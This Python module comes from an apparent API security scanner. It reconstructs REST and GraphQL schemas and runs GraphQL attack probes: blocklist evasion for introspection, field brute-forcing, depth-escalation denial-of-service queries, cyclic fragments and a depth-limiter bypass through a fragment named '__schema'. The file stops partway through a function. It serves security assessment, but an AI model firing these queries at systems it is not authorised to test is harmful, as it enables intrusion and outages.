#!/usr/bin/env python3
"""
Schema Builder Module - api-breaker
Reconstructs API schema from observed behavior, even without documentation.
Author: orizon.one
"""

import argparse
import json
import re
import time
import urllib.request
import urllib.parse
from datetime import datetime


from _common import http_request, log, success, vuln, warn
# Common field names to probe
PROBE_FIELDS = [
    "id", "name", "email", "username", "password", "title", "description",
    "status", "type", "role", "created_at", "updated_at", "price", "amount",
    "quantity", "url", "address", "phone", "message", "content", "body",
    "first_name", "last_name", "age", "date", "token", "key", "value",
    "is_active", "is_admin", "verified", "approved", "permissions",
]

# Common REST resource names
RESOURCE_NAMES = [
    "users", "accounts", "products", "orders", "items", "posts", "comments",
    "messages", "notifications", "settings", "categories", "tags", "files",
    "images", "documents", "payments", "transactions", "invoices", "tickets",
    "events", "groups", "roles", "permissions", "sessions", "tokens",
    "customers", "projects", "tasks", "reports", "logs", "webhooks",
]

HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]

# --- GraphQL depth techniques (research_notes/API breaker depth
# techniques/graphql_techniques.md) -------------------------------------

# GraphQL-idiomatic names to probe alongside this file's own REST-oriented
# PROBE_FIELDS/RESOURCE_NAMES -- graphql_techniques.md introspection-bypass
# Inferences step 3 ("plus GraphQL-idiomatic names like viewer, me, node,
# nodes, edges, connection").
GRAPHQL_IDIOMATIC_NAMES = [
    "viewer", "me", "node", "nodes", "edges", "connection", "pageInfo",
    "cursor", "hasNextPage", "hasPreviousPage", "totalCount", "currentUser",
    "self", "account", "profile",
]

# Self-referencing field-name pairs to fall back on for the depth/
# complexity DoS probe when no reconstructed schema is available --
# graphql_techniques.md "Nested/circular query DoS" Inferences step 1.
# Each pair is (field_a, field_b); field_b=None means the field nests into
# itself (e.g. children -> children -> children).
SELF_REFERENTIAL_FIELD_PAIRS = [
    ("children", None), ("parent", None), ("replies", None),
    ("author", "posts"), ("posts", "author"), ("owner", "items"),
    ("friends", None), ("subcategories", None), ("comments", None),
]

# Alternate GraphQL endpoint paths to retry introspection against --
# graphql_techniques.md introspection-bypass Inferences step 2.
ALT_GRAPHQL_PATHS = ["/graphql/v2", "/v2/graphql", "/api/graphql/v2", "/graphql/console"]

# Root "self" field names (no-arg, current-caller-identity fields) --
# graphql_techniques.md nested-field-authz Inferences step 1.
SELF_FIELD_NAMES = ["me", "viewer", "currentuser", "self"]

# Field names worth flagging with higher confidence when they leak from a
# by-ID sibling field but not the self field -- not an exhaustive list,
# just the research's own examples (email/role/internal flags) plus a few
# obvious equivalents. Any OTHER leaked field is still reported, just at
# "medium" rather than "high" confidence, since a null-vs-populated scalar
# can also just mean the other user's record happens to have that field
# filled in -- not necessarily a gating bug.
SENSITIVE_FIELD_NAMES = {
    "email", "password", "role", "is_admin", "permissions", "token",
    "key", "phone", "address", "username", "first_name", "last_name",
}

# No authoritative industry-standard numeric threshold for a "safe" query
# depth exists (graphql_techniques.md Gaps section, both the depth-DoS and
# alias-abuse sections say so explicitly) -- this escalation ladder and the
# growth-ratio heuristic in test_graphql_depth_complexity_dos() are this
# script's own reasoned defaults, not a sourced standard. Documented here
# instead of silently hardcoded.
DEFAULT_DEPTH_STEPS = [10, 20, 40, 80, 150, 300]

_DEPTH_ERROR_PATTERN = re.compile(r'max(?:imum)?\s*(?:query\s*)?depth|depth\s*(?:limit|exceed)|exceeds maximum', re.IGNORECASE)
_CYCLE_ERROR_PATTERN = re.compile(r'cycl|circular', re.IGNORECASE)
_UNKNOWN_FIELD_ERROR = re.compile(r'cannot query field|unknown field|unknown argument', re.IGNORECASE)
# \\? before each quote: the error text arrives JSON-encoded, so a literal
# quote around the suggested name is almost always escaped as \" in the
# raw wire body (e.g. '...Did you mean \"users\"?' ) -- without tolerating
# that optional backslash this never matched a real server response, only
# a hand-written test with bare quotes. Found by running the offline test
# against a JSON-escaped canned response, not by inspection.
_DID_YOU_MEAN_FIELD = re.compile(r'[Dd]id you mean[^?]*?\\?["\']([A-Za-z_][A-Za-z0-9_]*)\\?["\']')
_DID_YOU_MEAN_TYPES = re.compile(r'[Dd]id you mean one of these types:\s*([^?]+)\?')


def discover_methods(url, extra_headers=None, delay=0):
    """Discover allowed HTTP methods on an endpoint."""
    allowed = []

    # Try OPTIONS first for Allow header
    status, headers, _ = http_request(url, method="OPTIONS", headers=extra_headers)
    if delay:
        time.sleep(delay)
    if "Allow" in headers:
        allowed = [m.strip().upper() for m in headers["Allow"].split(",")]
        return allowed

    # Probe each method
    for method in HTTP_METHODS:
        status, headers, body = http_request(url, method=method, headers=extra_headers)
        if delay:
            time.sleep(delay)
        if status not in (0, 404, 501):
            allowed.append(method)
            if method == "OPTIONS" and "Allow" in headers:
                extra = [m.strip().upper() for m in headers["Allow"].split(",")]
                allowed.extend(extra)

    return list(set(allowed))


def probe_content_types(url, extra_headers=None, delay=0):
    """Test content negotiation to find accepted content types."""
    accepted = []
    content_types = [
        ("application/json", "json"),
        ("application/xml", "xml"),
        ("application/x-www-form-urlencoded", "form"),
        ("multipart/form-data", "multipart"),
        ("text/plain", "text"),
    ]

    for ct, label in content_types:
        headers = {"Accept": ct, "Content-Type": ct}
        if extra_headers:
            headers.update(extra_headers)
        status, resp_headers, body = http_request(url, headers=headers)
        if delay:
            time.sleep(delay)
        resp_ct = resp_headers.get("Content-Type", "").lower()
        if status not in (0, 404, 406, 415):
            accepted.append({
                "content_type": ct,
                "label": label,
                "status": status,
                "response_content_type": resp_ct,
            })

    return accepted


def extract_fields_from_response(body):
    """Extract field names and infer types from a JSON response."""
    fields = {}
    try:
        data = json.loads(body)
    except (json.JSONDecodeError, ValueError):
        return fields

    def extract(obj, prefix=""):
        if isinstance(obj, dict):
            for key, val in obj.items():
                full_key = f"{prefix}.{key}" if prefix else key
                fields[full_key] = infer_type(val)
                if isinstance(val, dict):
                    extract(val, full_key)
                elif isinstance(val, list) and val:
                    if isinstance(val[0], dict):
                        extract(val[0], full_key + "[]")
        elif isinstance(obj, list) and obj:
            if isinstance(obj[0], dict):
                extract(obj[0], prefix + "[]" if prefix else "[]")

    extract(data)
    return fields


def infer_type(value):
    """Infer OpenAPI type from a Python value."""
    if value is None:
        return "string"
    if isinstance(value, bool):
        return "boolean"
    if isinstance(value, int):
        return "integer"
    if isinstance(value, float):
        return "number"
    if isinstance(value, list):
        return "array"
    if isinstance(value, dict):
        return "object"
    return "string"


def extract_fields_from_errors(body):
    """Extract field names from error messages."""
    import re
    fields = set()

    patterns = [
        r"['\"](\w+)['\"]\s+is\s+required",
        r"missing\s+(?:required\s+)?(?:field|param|parameter|key)\s+['\"]?(\w+)['\"]?",
        r"['\"](\w+)['\"]\s+(?:must|should)\s+be",
        r"(?:field|param|parameter)\s+['\"](\w+)['\"]",
        r"expected\s+['\"]?(\w+)['\"]?",
        r"['\"](\w+)['\"]\s+(?:not found|invalid|unknown)",
        r"validation.*?['\"](\w+)['\"]",
    ]

    for pattern in patterns:
        for match in re.finditer(pattern, body, re.IGNORECASE):
            field = match.group(1)
            if len(field) > 1 and field.lower() not in ("the", "a", "an", "is", "be"):
                fields.add(field)

    return fields


def probe_fields_via_errors(url, method="POST", extra_headers=None, delay=0):
    """Send payloads to discover accepted fields via error responses."""
    discovered_fields = {}

    # Send empty body
    headers = {"Content-Type": "application/json"}
    if extra_headers:
        headers.update(extra_headers)

    status, _, body = http_request(url, method=method, headers=headers, data="{}")
    if delay:
        time.sleep(delay)

    error_fields = extract_fields_from_errors(body)
    for field in error_fields:
        discovered_fields[field] = "string"

    # Send each probe field individually to detect accepted ones
    for field in PROBE_FIELDS:
        test_payloads = [
            {field: "test_value"},
            {field: 12345},
            {field: True},
        ]

        for payload in test_payloads:
            data = json.dumps(payload)
            status, _, resp_body = http_request(url, method=method, headers=headers, data=data)
            if delay:
                time.sleep(delay)

            if status in (200, 201, 422, 400):
                # If 422/400 mentions the field differently than "unknown field", it's recognized
                lower_body = resp_body.lower()
                if status in (200, 201):
                    discovered_fields[field] = infer_type(payload[field])
                    break
                elif field.lower() in lower_body and "unknown" not in lower_body:
                    discovered_fields[field] = infer_type(payload[field])
                    break

                # Check error response for additional field hints
                more_fields = extract_fields_from_errors(resp_body)
                for f in more_fields:
                    if f not in discovered_fields:
                        discovered_fields[f] = "string"

    return discovered_fields


def discover_resources(base_url, extra_headers=None, delay=0):
    """Discover API resources by probing common paths."""
    found = []

    for resource in RESOURCE_NAMES:
        for prefix in ["/api/", "/api/v1/", "/api/v2/", "/v1/", "/v2/", "/"]:
            url = urllib.parse.urljoin(base_url, f"{prefix}{resource}")
            status, headers, body = http_request(url, headers=extra_headers)
            if delay:
                time.sleep(delay)

            if status in (200, 201, 401, 403):
                entry = {
                    "resource": resource,
                    "url": url,
                    "path": f"{prefix}{resource}",
                    "status": status,
                    "auth_required": status in (401, 403),
                }
                # Try to get fields from response
                if status == 200:
                    fields = extract_fields_from_response(body)
                    if fields:
                        entry["fields"] = fields
                found.append(entry)
                success(f"Resource: {prefix}{resource} (status={status})")
                break  # Found at this prefix, skip others

    return found


def _introspection_query_body():
    """The introspection query document (bare GraphQL, no JSON wrapper) --
    shared by every transport variant below."""
    return """{
        __schema {
            queryType { name }
            mutationType { name }
            types {
                name
                kind
                fields {
                    name
                    type { name kind ofType { name kind } }
                    args { name type { name kind } }
                }
            }
        }
    }"""


def _parse_introspection_body(body):
    """Shared parser: raw introspection response body -> types list, same
    shape the original single-shot build_graphql_schema() always returned."""
    try:
        data = json.loads(body)
        schema = data.get("data", {}).get("__schema", {})
        types = []
        for t in schema.get("types", []):
            if not t.get("name", "").startswith("__"):
                types.append({
                    "name": t["name"],
                    "kind": t.get("kind", ""),
                    "fields": [
                        {
                            "name": f["name"],
                            "type": f.get("type", {}).get("name", ""),
                            "args": [a["name"] for a in f.get("args", [])],
                        }
                        for f in (t.get("fields") or [])
                    ],
                })
        return types
    except (json.JSONDecodeError, KeyError, TypeError):
        return None


def _field_exists_in_response(status, body):
    """True when a response doesn't look like an 'unknown field' rejection
    -- i.e. the field/argument name itself was recognized by the server,
    independent of whether the query ultimately succeeded, errored on auth,
    or returned null data. Shared reject-oracle for the binary-oracle
    brute force, the node/nodes structural probe, and schema-pair probing
    below -- one classification rule, not three slightly-different ones."""
    if status == 0 or not body:
        return False
    if _UNKNOWN_FIELD_ERROR.search(body):
        return False
    return True


def _introspection_post_json(url, headers, delay=0):
    """The original, single-shot transport: POST, JSON body."""
    body = json.dumps({"query": _introspection_query_body()})
    status, _, resp_body = http_request(url, "POST", headers, body)
    if delay:
        time.sleep(delay)
    return resp_body if (status == 200 and "__schema" in resp_body) else None


def _introspection_get_urlencoded(url, headers, delay=0):
    """Transport retry (a): GET with the query URL-encoded in the
    querystring -- graphql_techniques.md introspection-bypass step 1."""
    query = urllib.parse.urlencode({"query": _introspection_query_body()})
    get_url = url + ("&" if "?" in url else "?") + query
    get_headers = {k: v for k, v in headers.items() if k.lower() != "content-type"}
    status, _, resp_body = http_request(get_url, "GET", get_headers)
    if delay:
        time.sleep(delay)
    return resp_body if (status == 200 and "__schema" in resp_body) else None


def _introspection_post_form(url, headers, delay=0):
    """Transport retry (a): POST as application/x-www-form-urlencoded
    instead of JSON -- graphql_techniques.md introspection-bypass step 1."""
    form_headers = dict(headers)
    form_headers["Content-Type"] = "application/x-www-form-urlencoded"
    body = urllib.parse.urlencode({"query": _introspection_query_body()})
    status, _, resp_body = http_request(url, "POST", form_headers, body)
    if delay:
        time.sleep(delay)
    return resp_body if (status == 200 and "__schema" in resp_body) else None


def _introspection_regex_evasion(url, headers, delay=0):
    """Regex-evasion retry (b): PortSwigger's GraphQL lab technique --
    a naive blocklist matching the literal substring '__schema{' is
    defeated by inserting insignificant whitespace/a comment immediately
    after the __schema token (GraphQL ignores it; the query stays valid,
    the regex no longer matches) -- graphql_techniques.md introspection-
    bypass step 2."""
    base_query = _introspection_query_body()
    variants = [
        base_query.replace("__schema", "__schema\n", 1),
        base_query.replace("__schema", "__schema #evasion\n", 1),
    ]
    for variant in variants:
        body = json.dumps({"query": variant})
        status, _, resp_body = http_request(url, "POST", headers, body)
        if delay:
            time.sleep(delay)
        if status == 200 and "__schema" in resp_body:
            return resp_body
    return None


def _introspection_alt_paths(url, headers, delay=0, alt_paths=None):
    """Retry the standard POST-JSON introspection against alternate
    GraphQL paths a naive per-path filter might not cover --
    graphql_techniques.md introspection-bypass step 2."""
    for alt_path in (alt_paths or ALT_GRAPHQL_PATHS):
        alt_url = urllib.parse.urljoin(url, alt_path)
        result = _introspection_post_json(alt_url, headers, delay)
        if result:
            return result, alt_url
    return None, None


def _suggestion_seed_wordlist():
    """Clairvoyance-style candidate wordlist: this file's own REST-oriented
    PROBE_FIELDS/RESOURCE_NAMES plus GraphQL-idiomatic names -- deliberately
    NOT shelling out to the external clairvoyance tool, per the task's own
    scoping note; this ports the technique, not the dependency."""
    seen, ordered = set(), []
    for name in PROBE_FIELDS + RESOURCE_NAMES + GRAPHQL_IDIOMATIC_NAMES:
        if name not in seen:
            seen.add(name)
            ordered.append(name)
    return ordered


def harvest_fields_via_suggestions(url, headers, delay=0, wordlist=None):
    """Field-suggestion harvesting (c), Clairvoyance-style: send a
    deliberately-wrong root field name and regex the error text for a
    'Did you mean' suggestion. Each match is a CONFIRMED real field/type
    name -- this reads the server's own validator telling us the right
    answer, it doesn't guess. graphql_techniques.md introspection-bypass
    step 3."""
    log("Harvesting field names via suggestion errors (Clairvoyance-style)...")
    candidates = wordlist or _suggestion_seed_wordlist()
    harvested = set()
    findings = []

    for candidate in candidates:
        probe_name = candidate + "_mythosx1"
        body = json.dumps({"query": "{ " + probe_name + " }"})
        status, _, resp_body = http_request(url, "POST", headers, body)
        if delay:
            time.sleep(delay)
        if status == 0 or not resp_body:
            continue

        for m in _DID_YOU_MEAN_FIELD.finditer(resp_body):
            name = m.group(1)
            if name not in ("Query", "Mutation", "Subscription"):
                harvested.add(name)

        type_match = _DID_YOU_MEAN_TYPES.search(resp_body)
        if type_match:
            for name in re.findall(r'[A-Za-z_][A-Za-z0-9_]*', type_match.group(1)):
                harvested.add(name)

    if harvested:
        success(f"Harvested {len(harvested)} field/type names via suggestion errors")
        findings.append({
            "type": "graphql_introspection_bypass",
            "severity": "medium",
            "technique": "field_suggestion_harvest",
            "url": url,
            "fields_recovered": sorted(harvested),
            "evidence": f"{len(harvested)} field/type names confirmed via 'Did you mean' suggestion "
                        f"errors despite introspection being blocked (PortSwigger/Clairvoyance class).",
        })
    return harvested, findings


def bruteforce_fields_binary_oracle(url, headers, delay=0, wordlist=None, max_candidates=60):
    """Binary-oracle brute force (d), last resort when suggestions are ALSO
    disabled: one request per candidate, classified purely by error shape
    via _field_exists_in_response(). Capped at max_candidates by default --
    this is the expensive, one-request-per-guess path.
    graphql_techniques.md introspection-bypass step 4."""
    log(f"Binary-oracle field brute force ({min(max_candidates, len(wordlist or _suggestion_seed_wordlist()))} candidates, last resort)...")
    candidates = (wordlist or _suggestion_seed_wordlist())[:max_candidates]
    confirmed = set()
    findings = []

    for candidate in candidates:
        body = json.dumps({"query": "{ " + candidate + " }"})
        status, _, resp_body = http_request(url, "POST", headers, body)
        if delay:
            time.sleep(delay)
        if _field_exists_in_response(status, resp_body):
            confirmed.add(candidate)

    if confirmed:
        success(f"Binary-oracle brute force confirmed {len(confirmed)} field names")
        findings.append({
            "type": "graphql_introspection_bypass",
            "severity": "medium",
            "technique": "binary_oracle_bruteforce",
            "url": url,
            "fields_recovered": sorted(confirmed),
            "evidence": f"{len(confirmed)} field names confirmed via error-shape classification "
                        f"(reject vs. non-reject) with introspection and suggestions both blocked.",
        })
    return confirmed, findings


def probe_node_nodes_fields(url, headers, delay=0):
    """Always-on, single-pair structural check (run regardless of which
    fallback above succeeded): a bare node(id:...)/nodes(ids:...) root
    field is a common Relay-style direct-object-access primitive,
    independent of the rest of the schema (OWASP GraphQL Cheat Sheet).
    graphql_techniques.md introspection-bypass step 5, reused by the
    nested-field-authz section's own 'cheap structural check' (step 6)."""
    log("Probing for node()/nodes() root fields...")
    result = {"node_present": False, "nodes_present": False}
    findings = []

    status, _, body = http_request(url, "POST", headers,
                                    json.dumps({"query": '{ node(id: "1") { __typename } }'}))
    if delay:
        time.sleep(delay)
    result["node_present"] = _field_exists_in_response(status, body)

    status, _, body = http_request(url, "POST", headers,
                                    json.dumps({"query": '{ nodes(ids: ["1"]) { __typename } }'}))
    if delay:
        time.sleep(delay)
    result["nodes_present"] = _field_exists_in_response(status, body)

    if result["node_present"] or result["nodes_present"]:
        warn(f"GraphQL node/nodes root field present (node={result['node_present']}, nodes={result['nodes_present']})")
        findings.append({
            "type": "graphql_node_field_present",
            "severity": "low",
            "url": url,
            "node_present": result["node_present"],
            "nodes_present": result["nodes_present"],
            "evidence": "Relay-style node()/nodes() global-ID lookup field is present -- a generic "
                        "cross-type object-access path that is easy to forget to re-gate per type "
                        "(OWASP GraphQL Cheat Sheet). Needs manual/automated per-type authz verification.",
        })
    return result, findings


def build_graphql_schema(url, extra_headers=None, delay=0):
    """Attempt GraphQL introspection to build a schema. When the standard
    single-shot query fails, run the full introspection-disabled fallback
    chain from graphql_techniques.md before giving up: transport retries,
    regex-evasion retries, alternate-path retries, field-suggestion
    harvesting, and binary-oracle brute force, each strictly cheaper-first.
    Always separately probes node()/nodes() regardless of which path (if
    any) succeeded. Returns (schema_dict, findings_list)."""
    log("Attempting GraphQL introspection...")
    findings = []

    headers = {"Content-Type": "application/json"}
    if extra_headers:
        headers.update(extra_headers)

    technique = "standard_post_json"
    raw = _introspection_post_json(url, headers, delay)

    if not raw:
        raw = _introspection_get_urlencoded(url, headers, delay)
        technique = "transport_get_urlencoded"
    if not raw:
        raw = _introspection_post_form(url, headers, delay)
        technique = "transport_post_form_urlencoded"
    if not raw:
        raw = _introspection_regex_evasion(url, headers, delay)
        technique = "regex_evasion"
    if not raw:
        raw, alt_url = _introspection_alt_paths(url, headers, delay)
        if raw:
            technique = "alternate_path"
            url = alt_url

    schema = {"introspection_enabled": False, "types": []}

    if raw:
        types = _parse_introspection_body(raw)
        if types is not None:
            schema = {"introspection_enabled": True, "types": types}
            success(f"GraphQL introspection: {len(types)} types discovered (technique={technique})")
            if technique != "standard_post_json":
                findings.append({
                    "type": "graphql_introspection_bypass",
                    "severity": "medium",
                    "technique": technique,
                    "url": url,
                    "evidence": f"Full schema introspection succeeded via '{technique}' after the "
                                f"standard POST/JSON introspection query was blocked or failed.",
                })
        else:
            raw = None

    if not raw:
        warn("Standard/transport/regex introspection bypasses all failed -- falling back to blind recovery")
        harvested, harvest_findings = harvest_fields_via_suggestions(url, headers, delay)
        findings.extend(harvest_findings)
        if not harvested:
            harvested, brute_findings = bruteforce_fields_binary_oracle(url, headers, delay)
            findings.extend(brute_findings)
        if harvested:
            schema["harvested_fields"] = sorted(harvested)
        else:
            warn("GraphQL introspection disabled or failed, and blind field recovery found nothing")

    node_result, node_findings = probe_node_nodes_fields(url, headers, delay)
    findings.extend(node_findings)
    schema["node_nodes_probe"] = node_result
    schema["endpoint_url"] = url

    return schema, findings


# --- Priority 2: depth/complexity DoS (graphql_techniques.md "Nested/
# circular query DoS") ---------------------------------------------------

def _find_self_referential_field(schema):
    """From a reconstructed schema, find a field whose return type is the
    SAME type it's declared on (direct self-reference), or a two-hop cycle
    (A.fieldX -> B, B.fieldY -> A). Returns an (field_a, field_b) pair
    ready for _build_nested_query(), or None if the schema has nothing
    usable (blind/no introspection) -- the caller falls back to
    SELF_REFERENTIAL_FIELD_PAIRS in that case."""
    if not schema or not schema.get("types"):
        return None
    types_by_name = {t["name"]: t for t in schema["types"]}

    for t in schema["types"]:
        for f in t.get("fields", []):
            if f.get("type") == t["name"]:
                return (f["name"], f["name"])

    for t in schema["types"]:
        for f in t.get("fields", []):
            target_type = f.get("type")
            if target_type and target_type in types_by_name and target_type != t["name"]:
                for tf in types_by_name[target_type].get("fields", []):
                    if tf.get("type") == t["name"]:
                        return (f["name"], tf["name"])
    return None


def _build_nested_query(field_pair, depth):
    """Build '{ f1 { f2 { f1 { ... __typename } } } }' alternating (or
    repeating, if f1==f2) field_pair out to the given nesting depth."""
    f1, f2 = field_pair
    inner = "__typename"
    for i in range(depth):
        name = f1 if (f1 == f2 or i % 2 == 0) else f2
        inner = f"{name} {{ {inner} }}"
    return "{ " + inner + " }"


def _pick_working_field_pair(url, headers, delay, candidate_pairs):
    """Try each candidate (field_a, field_b) pair at a shallow depth=2 and
    return the first one that doesn't look like an unknown-field rejection
    -- avoids running the full, expensive depth-escalation ladder against
    a field name that doesn't even exist on this target."""
    for f1, f2 in candidate_pairs:
        pair = (f1, f2 or f1)
        query = _build_nested_query(pair, 2)
        status, _, body = http_request(url, "POST", headers, json.dumps({"query": query}), timeout=10)
        if delay:
            time.sleep(delay)
        if _field_exists_in_response(status, body):
            return pair
    return None


def test_graphql_depth_complexity_dos(url, schema=None, extra_headers=None, delay=0,
                                       depth_steps=None, timeout=15):
    """Escalate query nesting depth against a self-referencing field with a
    hard client-side timeout, classifying the result (graphql_techniques.md
    Inferences steps 1-3):
      (a) a "depth"/"exceeds maximum" validation error at some N -> depth
          limiting is present (recorded as an info-level finding with the
          threshold).
      (b) response time growing non-linearly with NO error -> cost/
          complexity limiting is absent, even if depth limiting exists
          (medium finding).
      (c) a timeout, 5xx, or dropped connection -> confirmed DoS (high
          finding), and escalation stops immediately.
    See the DEFAULT_DEPTH_STEPS comment: there is no sourced numeric
    "safe" threshold, so both the step ladder and the growth-ratio
    heuristic below are this script's own reasoned defaults.
    Returns (findings, depth_limit_threshold_or_None, field_pair_or_None)
    -- the threshold and field pair are reused by the introspection-naming
    bypass retry below."""
    log("Testing GraphQL query depth/complexity DoS resilience...")
    findings = []
    headers = {"Content-Type": "application/json"}
    if extra_headers:
        headers.update(extra_headers)
    steps = depth_steps or DEFAULT_DEPTH_STEPS

    candidate_pairs = []
    derived = _find_self_referential_field(schema) if schema else None
    if derived:
        candidate_pairs.append(derived)
    candidate_pairs.extend((f1, f2) for f1, f2 in SELF_REFERENTIAL_FIELD_PAIRS)

    field_pair = _pick_working_field_pair(url, headers, delay, candidate_pairs)
    if not field_pair:
        log("No working self-referential field found -- skipping depth/complexity DoS probe")
        return findings, None, None

    log(f"Using self-referential field pair for depth escalation: {field_pair}")

    timings = []
    depth_limit_threshold = None
    dos_confirmed = False

    for depth in steps:
        query = _build_nested_query(field_pair, depth)
        start = time.monotonic()
        status, _, body = http_request(url, "POST", headers, json.dumps({"query": query}), timeout=timeout)
        elapsed = time.monotonic() - start
        if delay:
            time.sleep(delay)

        if status == 0 or elapsed >= timeout * 0.95:
            vuln(f"GraphQL depth DoS: depth={depth} timed out/dropped after {elapsed:.1f}s")
            dos_confirmed = True
            findings.append({
                "type": "graphql_depth_complexity_dos", "severity": "high",
                "classification": "dos_confirmed", "url": url, "depth": depth,
                "elapsed_seconds": round(elapsed, 2), "field_pair": list(field_pair),
                "evidence": f"Query at nesting depth {depth} timed out/dropped the connection "
                            f"(client timeout={timeout}s) before any depth or cost limit stopped it.",
            })
            break

        if status >= 500:
            vuln(f"GraphQL depth DoS: depth={depth} returned HTTP {status}")
            dos_confirmed = True
            findings.append({
                "type": "graphql_depth_complexity_dos", "severity": "high",
                "classification": "dos_confirmed", "url": url, "depth": depth,
                "http_status": status, "elapsed_seconds": round(elapsed, 2),
                "field_pair": list(field_pair),
                "evidence": f"Query at nesting depth {depth} returned HTTP {status}.",
            })
            break

        if _DEPTH_ERROR_PATTERN.search(body):
            success(f"GraphQL depth limiting present -- rejected at depth={depth}")
            depth_limit_threshold = depth
            findings.append({
                "type": "graphql_depth_complexity_dos", "severity": "info",
                "classification": "depth_limit_detected", "url": url,
                "depth_limit_threshold": depth, "field_pair": list(field_pair),
                "evidence": f"Server rejected nesting depth {depth} with a depth/validation error "
                            f"-- depth limiting is present.",
            })
            break

        timings.append((depth, elapsed))

    if not dos_confirmed and len(timings) >= 2:
        first_depth, first_elapsed = timings[0]
        last_depth, last_elapsed = timings[-1]
        depth_ratio = (last_depth / first_depth) if first_depth else None
        growth_ratio = (last_elapsed / first_elapsed) if first_elapsed > 0.01 else None
        # Heuristic (see DEFAULT_DEPTH_STEPS comment, not a sourced
        # standard): latency growing super-linearly relative to depth with
        # zero rejecting errors anywhere on the ladder is the Wallarm/
        # Escape "cost limiting absent" signal, independent of whether
        # depth limiting itself exists.
        if growth_ratio is not None and depth_ratio and growth_ratio > depth_ratio * 1.5:
            warn(f"GraphQL cost/complexity limiting appears absent -- latency grew {growth_ratio:.1f}x "
                 f"over a {depth_ratio:.1f}x depth increase with no rejecting error")
            findings.append({
                "type": "graphql_depth_complexity_dos", "severity": "medium",
                "classification": "cost_limiting_absent", "url": url,
                "depth_limit_present": depth_limit_threshold is not None,
                "timings": [{"depth": d, "elapsed_seconds": round(e, 3)} for d, e in timings],
                "field_pair": list(field_pair),
                "evidence": f"Latency grew {growth_ratio:.1f}x across a {depth_ratio:.1f}x depth "
                            f"increase with no depth/validation error -- cost/complexity limiting is "
                            f"absent even though depth limiting present={depth_limit_threshold is not None}.",
            })
        elif depth_limit_threshold is None:
            log(f"Reached max tested depth ({steps[-1]}) with no error and no clear non-linear growth -- "
                f"inconclusive, target may have limits above this ladder")

    return findings, depth_limit_threshold, field_pair


def test_graphql_fragment_cycle(url, schema=None, extra_headers=None, delay=0):
    """Direct, cheap, high-signal probe (graphql_techniques.md Inferences
    step 5): two named fragments referencing each other. A spec-compliant
    validator rejects this (GraphQL spec 5.5.2.2, "fragment spreads must
    not form cycles"); if the server accepts/executes it instead, that's a
    high-severity finding on its own, independent of timing."""
    log("Testing GraphQL fragment-cycle rejection...")
    findings = []
    headers = {"Content-Type": "application/json"}
    if extra_headers:
        headers.update(extra_headers)

    type_name = "Query"
    if schema and schema.get("types"):
        object_types = [t["name"] for t in schema["types"] if t.get("kind") == "OBJECT"]
        if object_types:
            type_name = object_types[0]

    query = (
        "query { ...CycleA } "
        f"fragment CycleA on {type_name} {{ ...CycleB }} "
        f"fragment CycleB on {type_name} {{ ...CycleA }}"
    )
    status, _, body = http_request(url, "POST", headers, json.dumps({"query": query}), timeout=10)
    if delay:
        time.sleep(delay)

    if status == 0 or not body:
        log("Fragment-cycle probe: no response -- inconclusive")
        return findings

    if _CYCLE_ERROR_PATTERN.search(body) or status in (400, 422):
        log("Fragment-cycle probe: rejected (as expected for a spec-compliant validator)")
        return findings

    if status == 200:
        try:
            parsed = json.loads(body)
        except (json.JSONDecodeError, ValueError):
            parsed = {}
        if not parsed.get("errors"):
            vuln("GraphQL fragment cycle ACCEPTED/EXECUTED -- validator does not reject cyclic fragments")
            findings.append({
                "type": "graphql_fragment_cycle_accepted", "severity": "high",
                "url": url, "type_used": type_name, "http_status": status,
                "evidence": "Two mutually-referencing named fragments were accepted/executed instead "
                            "of being rejected at validation time (GraphQL spec 5.5.2.2).",
            })
        elif not _CYCLE_ERROR_PATTERN.search(json.dumps(parsed.get("errors"))):
            log("Fragment-cycle probe: errored for a reason unrelated to cycle detection -- inconclusive")

    return findings


def test_graphql_introspection_naming_bypass(url, depth_limit_threshold, field_pair,
                                              query_type_name="Query", extra_headers=None,
                                              delay=0, timeout=15):
    """GHSA-hmfr-rx46-4jx2-class probe, run ONLY once a depth limiter is
    confirmed present (caller passes the threshold depth that triggered
    rejection). graphql-armor's max-depth plugin (and similar
    depth-limiting middleware) defaults to ignoreIntrospection=True and
    skips depth-counting for anything reached through a node NAMED
    '__schema' -- wrap the SAME self-referential field chain that
    triggered the real limit inside a fragment literally named '__schema'
    and see if it now sails through past the same depth. NOTE: the exact
    internal skip-heuristic was not independently verified against
    graphql-armor's primary source (graphql_techniques.md Gaps section
    hedges the same way) -- a non-triggering result here is evidence of a
    probable bypass, not a certain one."""
    log("Testing introspection-naming depth-limit bypass (GHSA-hmfr-rx46-4jx2 class)...")
    findings = []
    headers = {"Content-Type": "application/json"}
    if extra_headers:
        headers.update(extra_headers)

    bypass_depth = depth_limit_threshold + 5
    f1, f2 = field_pair
    inner = "__typename"
    for i in range(bypass_depth):
        name = f1 if (f1 == f2 or i % 2 == 0) else f2
        inner = f"{name} {{ {inner} }}"
    query = "query { ...__schema } fragment __schema on " + query_type_name + " { " + inner + " }"

    status, _, body = http_request(url, "POST", headers, json.dumps({"query": query}), timeout=timeout)
    if delay:
        time.sleep(delay)

    if status == 0 or not body:
        log("Introspection-naming bypass probe: no response -- inconclusive")
        return findings

    if not _DEPTH_ERROR_PATTERN.search(body):
        vuln(f"GraphQL depth limit bypassed via '__schema'-named fragment at depth={bypass_depth} "
             f"(normal limiter triggers at {depth_limit_threshold})")
        findings.append({
            "type": "graphql_depth_limit_bypass_introspection_naming", "severity": "high",
            "url": url, "bypass_depth": bypass_depth,
            "normal_depth_limit_threshold": depth_limit_threshold, "field_pair": list(field_pair),
            "evidence": f"Wrapping the same self-referential field chain (depth {bypass_depth}) inside "
                        f"a fragment literally named '__schema' avoided the depth-limit error that "
                        f"triggered at depth {depth_limit_threshold} without that naming -- consistent "
                        f"with the graphql-armor ignoreIntrospection=True default bypass "
                        f"(GHSA-hmfr-rx46-4jx2).",
        })
    else:
        log("Introspection-naming bypass probe: still rejected -- limiter is not bypassable this way")
    return findings


# --- Priority 3: nested-field authorization bypass (graphql_techniques.md
# "Authorization bypass specific to GraphQL") ----------------------------

def _find_self_and_sibling_fields(schema):
    """From a reconstructed schema, find a no-arg 'self' root query field
    (me/viewer/currentUser/self) and a sibling root field that takes an
    ID-shaped argument and returns the SAME type. graphql_techniques.md
    nested-field-authz Inferences step 1. Returns a dict or None."""
    if not schema or not schema.get("types"):
        return None
    query_type = next((t for t in schema["types"] if t["name"].lower() == "query"), None)
    if not query_type:
        return None

